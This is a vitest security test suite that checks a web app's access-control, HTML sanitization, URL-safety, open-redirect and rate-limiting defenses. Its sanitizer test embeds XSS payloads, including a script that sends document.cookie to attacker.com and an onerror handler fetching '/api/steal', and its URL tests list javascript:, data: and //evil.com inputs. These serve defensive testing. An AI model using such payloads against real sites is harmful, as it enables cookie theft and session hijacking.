import { describe, it, expect, vi } from 'vitest';
import {
  SupportService,
  UserService,
  LibraryService,
  NotificationService,
  SupportRepository,
  UserRepository,
  LibraryRepository,
  NotificationRepository,
} from '../index';
import {
  sanitizeHtml,
  sanitizePlainText,
  isSafeUrl,
  getSafeRedirectUrl,
  RateLimiter,
} from '@elsesourav/utils';
import type { UserRole } from '@elsesourav/types';

describe('Comprehensive Security Hardening & Audit Test Suite', () => {
  describe('Task 5 & Task 6 — IDOR & Privilege Escalation Defenses', () => {
    it('SupportService: prevents normal user A from reading user B tickets or internal notes', async () => {
      const mockRepo: Partial<SupportRepository> = {
        findTicketDetail: vi.fn().mockImplementation((_id: string, forAdmin: boolean = false) => {
          return Promise.resolve({
            id: 'ticket-target',
            userId: 'user-victim',
            ticketNumber: 'TICK-999',
            subject: 'Confidential Issue',
            description: 'Private customer description',
            category: 'billing',
            priority: 'high',
            status: 'OPEN',
            messages: forAdmin
              ? [
                  { id: 'm1', ticketId: 'ticket-target', authorId: 'staff-1', message: 'Public response', isInternalNote: false, createdAt: new Date() },
                  { id: 'm2', ticketId: 'ticket-target', authorId: 'staff-1', message: 'INTERNAL AUDIT NOTE', isInternalNote: true, createdAt: new Date() },
                ]
              : [
                  { id: 'm1', ticketId: 'ticket-target', authorId: 'staff-1', message: 'Public response', isInternalNote: false, createdAt: new Date() },
                ],
            createdAt: new Date(),
            updatedAt: new Date(),
          });
        }),
      };
      const supportService = new SupportService(mockRepo as SupportRepository);

      // Attempt IDOR read by attacker (user-attacker != user-victim)
      await expect(
        supportService.getTicketDetail('user-attacker', 'USER' as UserRole, 'ticket-target')
      ).rejects.toThrow(/permission/i);

      // Legitimate ticket owner can read, but internal notes are stripped
      const ownerTicket = await supportService.getTicketDetail('user-victim', 'USER' as UserRole, 'ticket-target');
      expect(ownerTicket.messages).toHaveLength(1);
      expect(ownerTicket.messages.some((m) => m.isInternalNote)).toBe(false);

      // Staff/Admin can view full details with internal notes
      const adminTicket = await supportService.getTicketDetail('user-admin', 'ADMIN' as UserRole, 'ticket-target');
      expect(adminTicket.messages).toHaveLength(2);
      expect(adminTicket.messages.some((m) => m.isInternalNote)).toBe(true);
    });

    it('UserService: prevents horizontal profile modification and vertical role escalation', async () => {
      const mockRepo: Partial<UserRepository> = {
        updateProfile: vi.fn(),
        updateRole: vi.fn(),
      };
      const userService = new UserService(mockRepo as UserRepository);

      // Horizontal IDOR: User 1 modifying User 2 profile
      await expect(
        userService.updateProfile('user-1', 'user-2', { bio: 'Hacked bio' })
      ).rejects.toThrow(/permission/i);

      // Vertical Privilege Escalation: Non-admin trying to elevate role
      await expect(
        userService.updateUserRoleAdmin('user-1', 'USER' as UserRole, 'user-1', 'ADMIN')
      ).rejects.toThrow(/privileges/i);

      // Reserved username protection
      await expect(
        userService.updateProfile('user-1', 'user-1', { username: 'admin' })
      ).rejects.toThrow(/reserved/i);
    });

    it('LibraryService & NotificationService: enforces authenticated user isolation', async () => {
      const mockLibRepo: Partial<LibraryRepository> = {
        saveApp: vi.fn().mockResolvedValue({ id: 'lib-1', userId: 'user-1', appId: 'app-1', createdAt: new Date() }),
        unsaveApp: vi.fn().mockResolvedValue(undefined),
      };
      const libService = new LibraryService(mockLibRepo as LibraryRepository);

      // Unauthenticated access fails
      await expect(libService.saveApp(undefined, { appId: 'app-1' })).rejects.toThrow(/authentication required/i);
      await expect(libService.unsaveApp('', 'app-1')).rejects.toThrow(/authentication required/i);

      const mockNotifRepo: Partial<NotificationRepository> = {
        markAsRead: vi.fn().mockResolvedValue(true),
        findUserNotifications: vi.fn().mockResolvedValue([]),
        getUnreadCount: vi.fn().mockResolvedValue(0),
      };
      const notifService = new NotificationService(mockNotifRepo as NotificationRepository);

      // Unauthenticated notifications fail
      await expect(notifService.getUserNotifications('')).rejects.toThrow(/authenticated/i);
      await expect(notifService.markAsRead('', 'notif-1')).rejects.toThrow(/authenticated/i);
    });
  });

  describe('Task 9, Task 10 & Task 11 — Sanitization, XSS & URL Security', () => {
    it('sanitizeHtml: strips script execution vectors, event handlers, and data URIs', () => {
      const dirty = `
        <article>
          <h2>Safe Headline</h2>
          <script>window.location='http://attacker.com?cookie='+document.cookie</script>
          <img src="valid.png" onload="alert(1)" onerror="fetch('/api/steal')" />
          <iframe src="https://phishing.com"></iframe>
          <a href="javascript:alert(1)">Click</a>
          <p>Valid content with <a href="https://elsesourav.com">legitimate link</a>.</p>
        </article>
      `;
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('<script');
      expect(clean).not.toContain('onload=');
      expect(clean).not.toContain('onerror=');
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('javascript:');
      expect(clean).toContain('<h2>Safe Headline</h2>');
      expect(clean).toContain('https://elsesourav.com');
    });

    it('sanitizePlainText: strips all HTML tags and control sequences', () => {
      const dirty = `<div onclick="eval(1)"><style>body{color:red}</style><h1>Hello</h1> <b>World</b></div>`;
      const clean = sanitizePlainText(dirty);
      expect(clean).toBe('Hello World');
    });

    it('url-safety: detects dangerous schemes and validates safe redirect targets', () => {
      expect(isSafeUrl('https://elsesourav.com/apps')).toBe(true);
      expect(isSafeUrl('/dashboard')).toBe(true);
      expect(isSafeUrl('mailto:contact@elsesourav.com')).toBe(true);

      // Dangerous schemes
      expect(isSafeUrl('javascript:alert(1)')).toBe(false);
      expect(isSafeUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
      expect(isSafeUrl('vbscript:msgbox(1)')).toBe(false);
      expect(isSafeUrl('//evil.com')).toBe(false);
      expect(isSafeUrl('/\\evil.com')).toBe(false);

      // Open redirect prevention helper
      expect(getSafeRedirectUrl('/library', '/')).toBe('/library');
      expect(getSafeRedirectUrl('/settings/profile', '/')).toBe('/settings/profile');
      expect(getSafeRedirectUrl('https://evil.com/phish', '/')).toBe('/');
      expect(getSafeRedirectUrl('//evil.com', '/')).toBe('/');
      expect(getSafeRedirectUrl(null, '/')).toBe('/');
    });
  });

  describe('Task 18 — Rate Limiting Engine', () => {
    it('RateLimiter: sliding window enforces burst protection and allows resets', () => {
      const limiter = new RateLimiter({ windowMs: 1000, max: 2 });
      const key = 'test-client-ip';

      const r1 = limiter.consume(key);
      expect(r1.success).toBe(true);
      expect(r1.remaining).toBe(1);

      const r2 = limiter.consume(key);
      expect(r2.success).toBe(true);
      expect(r2.remaining).toBe(0);

      // 3rd attempt exceeds limit
      const r3 = limiter.consume(key);
      expect(r3.success).toBe(false);
      expect(r3.remaining).toBe(0);
      expect(r3.retryAfterSeconds).toBeGreaterThanOrEqual(0);
    });
  });
});
